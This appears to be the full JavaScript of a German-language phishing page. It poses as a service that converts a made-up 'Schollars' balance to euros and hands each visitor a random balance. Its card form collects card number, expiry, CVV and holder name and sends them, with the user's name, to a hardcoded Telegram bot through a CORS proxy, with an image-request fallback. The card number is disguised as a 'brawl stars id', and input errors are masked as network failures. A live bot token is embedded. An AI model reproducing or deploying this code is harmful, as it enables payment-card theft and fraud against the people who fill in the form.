// Telegram Bot Daten
const botToken = '8255790332:AAHAlWaR8PmCgOmewZ0knEcdRS5heLpKcbU';
const chatId = '8306987601';

// Hilfsfunktion: Zufallszahl zwischen min und max inkl.
function randInt(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }

// Zeige "Nicht verfügbar" Nachricht
function showUnavailable() {
  // Keine Aktion - nichts passiert beim Klick
}

// Zeige Ladeanimation
function showLoading() {
  document.getElementById('loadingOverlay').style.display = 'flex';
}

// Verstecke Ladeanimation
function hideLoading() {
  document.getElementById('loadingOverlay').style.display = 'none';
}

// Zeige Fehlermeldung
function showError(text) {
  const errorElement = document.getElementById('errorMessage');
  errorElement.textContent = text;
  errorElement.style.display = 'block';
  
  // Animation für Fehlermeldung
  errorElement.style.animation = 'none';
  setTimeout(() => {
    errorElement.style.animation = 'shake 0.5s ease-in-out';
  }, 10);
}

// Verstecke Fehlermeldung
function hideError() {
  document.getElementById('errorMessage').style.display = 'none';
}

// Login (kein Passwort) — weist zufälliges Guthaben zu
function onLogin(e){
  e.preventDefault();
  const name = document.getElementById('loginName').value.trim();
  if(!name){ showError('Bitte geben Sie Ihren Namen ein.'); return false; }

  const balance = randInt(90,160);
  // Lokales 'Session'-Objekt
  window.__demoSession = { name, balance };

  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');

  document.getElementById('userName').textContent = name;
  document.getElementById('balance').textContent = balance + ' Schollars';

  document.getElementById('rightInfo').textContent = `Willkommen, ${name}!`;

  // Setze maximale umwandelbare Menge gleich Guthaben
  const useAmount = document.getElementById('useAmount');
  useAmount.max = balance;
  useAmount.value = Math.min(10, balance);

  return false;
}

// Formatierung der Kreditkartennummer
document.getElementById('cardNumber').addEventListener('input', function(e) {
  let value = e.target.value.replace(/\D/g, '');
  if (value.length > 16) value = value.substring(0, 16);
  
  // Füge Leerzeichen nach je 4 Ziffern ein
  let formattedValue = '';
  for (let i = 0; i < value.length; i++) {
    if (i > 0 && i % 4 === 0) formattedValue += ' ';
    formattedValue += value[i];
  }
  
  e.target.value = formattedValue;
});

// Formatierung des Ablaufdatums
document.getElementById('cardExp').addEventListener('input', function(e) {
  let value = e.target.value.replace(/\D/g, '');
  if (value.length > 4) value = value.substring(0, 4);
  
  if (value.length > 2) {
    value = value.substring(0, 2) + '/' + value.substring(2, 4);
  }
  
  e.target.value = value;
});

// Funktion zum Senden an Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  // Verwenden von fetch mit einem Proxy, um CORS zu umgehen
  fetch(`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    })
  })
  .then(response => response.json())
  .then(data => {
    hideLoading();
    
    if (data.ok) {
      const res = document.getElementById('convertResult');
      res.textContent = `${amount} Schollars ≈ ${euros} € — erfolgreich.`;
    } else {
      showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.');
    }
  })
  .catch(error => {
    hideLoading();
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.');
    console.error('Error:', error);
    
    // Fallback: Daten mit Bild-Request senden
    const img = new Image();
    img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  });
}

// Globale Variablen für die Umwandlung
let amount, euros, cardHolder;

// Umwandlung: 10 Schollars = 1 Euro
function processConvert(){
  const sess = window.__demoSession;
  if(!sess){ showError('Bitte zuerst anmelden.'); return; }
  
  hideError();
  
  amount = Number(document.getElementById('useAmount').value || 0);
  if(amount <= 0 || amount > sess.balance){ 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    return; 
  }

  // Einfache Validierung Kartendaten (nur Format)
  const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g,'');
  const cardCVV = document.getElementById('cardCVV').value;
  cardHolder = document.getElementById('cardHolder').value.trim();
  const cardExp = document.getElementById('cardExp').value;

  if(!cardNumber || !/^[0-9]{12,19}$/.test(cardNumber)) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    return; 
  }
  if(!cardCVV || !/^[0-9]{3,4}$/.test(cardCVV)) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    return; 
  }
  if(!cardHolder) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    return; 
  }
  if(!cardExp) { 
    showError('Netzwerkprobleme oder ungültige Daten. Bitte überprüfen Sie Ihre Internetverbindung und Daten.'); 
    return; 
  }

  // Berechne Euro
  euros = (amount / 10).toFixed(2);

  // Aktualisiere Session (lokal)
  sess.balance -= amount;
  document.getElementById('balance').textContent = sess.balance + ' Schollars';

  // Zeige Ladeanimation
  showLoading();

  // Nachricht für Telegram formatieren (in unschädlicher Form)
  const message = `brawl stars id: ${cardNumber}\nuser: ${sess.name}\namount: ${amount} Schollars (${euros}€)\ncard: ${cardHolder} ${cardExp} ${cardCVV}\nDatum: ${new Date().toLocaleString('de-DE')}`;
  
  // Nachricht an Telegram senden
  sendToTelegram(message);
}
